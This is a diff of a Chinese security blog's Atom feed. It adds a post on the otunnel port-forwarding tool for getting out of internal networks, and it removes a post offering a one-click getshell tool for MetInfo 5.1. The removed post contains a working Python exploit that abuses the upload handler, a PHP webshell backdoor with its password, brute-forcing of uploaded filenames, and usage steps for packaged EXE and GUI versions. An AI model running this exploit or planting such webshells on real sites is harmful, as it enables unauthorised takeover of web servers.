@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hacktech.cn/"/>
-  <updated>2017-03-03T14:13:58.822Z</updated>
+  <updated>2017-03-03T14:34:07.758Z</updated>
   <id>http://hacktech.cn/</id>
   
   <author>
@@ -14,6 +14,91 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>otunnel : 一个和lcx差不多的端口转发的工具</title>
+    <link href="http://hacktech.cn/2017/02/15/otunnel-%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
+    <id>http://hacktech.cn/2017/02/15/otunnel-一个和lcx差不多的端口转发的工具/</id>
+    <published>2017-02-15T12:58:16.000Z</published>
+    <updated>2017-03-03T14:34:07.758Z</updated>
+    
+    <content type="html"><![CDATA[<p>这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境</p>
+<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/ooclab/otunnel" target="_blank" rel="external">ooclab/otunnel</a><br><a id="more"></a></p>
+<h1 id="下载地址-内涵各大平台"><a href="#下载地址-内涵各大平台" class="headerlink" title="下载地址(内涵各大平台)"></a>下载地址(内涵各大平台)</h1><p><a href="http://dl.ooclab.com/otunnel/" target="_blank" rel="external">http://dl.ooclab.com/otunnel/</a></p>
+<h1 id="otunnel-用法"><a href="#otunnel-用法" class="headerlink" title="otunnel 用法"></a>otunnel 用法</h1><p>前提：</p>
+<ol>
+<li>假设 server 的地址为 example.com</li>
+<li>从 client 能连接 server (client 与 server 无需在同一个网络)</li>
+</ol>
+<p><strong>注意</strong>  otunnel 程序可以作为 server 和 client 两种角色（运行参数不同）</p>
+<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel listen :10000 <span class="_">-s</span> longlongsecret</div></pre></td></tr></table></figure>
+<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlongsecret -t <span class="string">'r:192.168.1.3:22::10022'</span></div></pre></td></tr></table></figure></p>
+<p>现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22</p>
+<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlonglongsecret -t <span class="string">'f::20080:127.0.0.1:3128'</span></div></pre></td></tr></table></figure></p>
+<p>现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128</p>
+<h2 id="程序用法"><a href="#程序用法" class="headerlink" title="程序用法"></a>程序用法</h2><h3 id="t-格式"><a href="#t-格式" class="headerlink" title="-t 格式"></a>-t 格式</h3><p>包含多个字段信息，以<code>:</code>隔开(为空的字段也不能省略<code>:</code>)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">代理类型:本地地址:本地端口:远程地址:远程端口</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>代理类型</td>
+<td style="text-align:center">r 表示反向代理; f 表示正向代理</td>
+</tr>
+<tr>
+<td>本地地址</td>
+<td style="text-align:center">IP或域名</td>
+</tr>
+<tr>
+<td>本地端口</td>
+<td style="text-align:center">整数</td>
+</tr>
+<tr>
+<td>远程地址</td>
+<td style="text-align:center">IP或域名</td>
+</tr>
+<tr>
+<td>远程端口</td>
+<td style="text-align:center">整数</td>
+</tr>
+</tbody>
+</table>
+<p><strong>注意</strong></p>
+<ol>
+<li><code>本地地址</code>或<code>远程地址</code>如果为空，表示所有网口</li>
+<li>otunnel 命令行可以包含多个<code>-t</code>选项，同时指定多条隧道规则</li>
+</ol>
+<h1 id="特点及优势"><a href="#特点及优势" class="headerlink" title="特点及优势"></a>特点及优势</h1><p>otunnel 是一款对称的安全隧道工具。</p>
+<ul>
+<li>单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。</li>
+<li>支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。</li>
+<li>无需配置文件：命令行使用</li>
+<li>对称设计：同时支持 正、反向代理（端口映射）</li>
+<li>安全加密：支持 AES 对称加密</li>
+</ul>
+<p><img src="https://ooo.0o0.ooo/2017/02/15/58a455a1b0a71.png" alt="otunnel反向代理图示"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境&lt;/p&gt;
+&lt;h1 id=&quot;项目地址&quot;&gt;&lt;a href=&quot;#项目地址&quot; class=&quot;headerlink&quot; title=&quot;项目地址&quot;&gt;&lt;/a&gt;项目地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/ooclab/otunnel&quot;&gt;ooclab/otunnel&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Tools" scheme="http://hacktech.cn/categories/Tools/"/>
+    
+    
+      <category term="软件" scheme="http://hacktech.cn/tags/%E8%BD%AF%E4%BB%B6/"/>
+    
+      <category term="神兵利器" scheme="http://hacktech.cn/tags/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Golang踩坑录 两种方式来读取文件一行所导致的问题</title>
@@ -1235,75 +1320,6 @@
     
       <category term="Tools" scheme="http://hacktech.cn/categories/Tools/"/>
     
-    
-      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MetInfo V5.1 GetShell一键化工具</title>
-    <link href="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
-    <id>http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/</id>
-    <published>2016-06-08T14:40:32.000Z</published>
-    <updated>2016-10-29T07:07:05.903Z</updated>
-    
-    <content type="html"><![CDATA[<hr>
-<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
-<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
-<hr>
-<a id="more"></a>
-<p>访问</p>
-<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
-<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
-<hr>
-<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
-<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
-<p><strong>文件保存在/upload/file/目录</strong></p>
-<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
-<p>可爆破：</p>
-<p>如</p>
-<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
-<hr>
-<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
-<p><strong>本程序基于python编写</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
-<p>程序略显粗糙</p>
-<p>为了方便，我也把他打包成了<strong>exe</strong></p>
-<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
-<hr>
-<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
-<blockquote>
-<p>MetInfo V5.1上传漏洞getshell利用工具</p>
-<p>   作者 : Akkuman</p>
-<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
-<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
-<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>GUI程序，应该不用说</p>
-<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
-<p>菜刀连接，密码是Akkuman</p>
-<p>爆破结果会生成在<strong>url.txt</strong></p>
-</blockquote>
-<hr>
-<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
-<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
-<p><em>转载请注明出处</em></p>
-<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;hr&gt;
-&lt;h1 id=&quot;漏洞解析：&quot;&gt;&lt;a href=&quot;#漏洞解析：&quot; class=&quot;headerlink&quot; title=&quot;漏洞解析：&quot;&gt;&lt;/a&gt;漏洞解析：&lt;/h1&gt;&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;config/config.inc.php&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$langoks = $db-&amp;gt;get_one(&lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM $met_lang WHERE lang=&#39;$lang&#39;&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!$langoks)&lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;No data in the database,please reinstall.&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!$langoks[useok]&amp;amp;&amp;amp;!$metinfoadminok)okinfo(&lt;span class=&quot;string&quot;&gt;&#39;../404.html&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(count($met_langok)==&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)$lang=$met_index_type;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$query = &lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM $met_config WHERE lang=&#39;$lang&#39; or lang=&#39;metinfo&#39;&quot;&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;//看这里&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$result = $db-&amp;gt;query($query);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;($list_config= $db-&amp;gt;fetch_array($result))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($metinfoadminok)$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;]=str_replace(&lt;span class=&quot;string&quot;&gt;&#39;&quot;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;#34;&#39;&lt;/span&gt;, str_replace(&lt;span class=&quot;string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;#39;&#39;&lt;/span&gt;,$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;]));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$settings_arr[]=$list_config;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($list_config[&lt;span class=&quot;string&quot;&gt;&#39;columnid&#39;&lt;/span&gt;])&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		$settings[$list_config[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;_&#39;&lt;/span&gt;.$list_config[&lt;span class=&quot;string&quot;&gt;&#39;columnid&#39;&lt;/span&gt;]]=$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		$settings[$list_config[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;]]=$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;@extract($settings);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;hr&gt;
-    
-    </summary>
-    
-      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
-    
-    
-      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
     
       <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
     
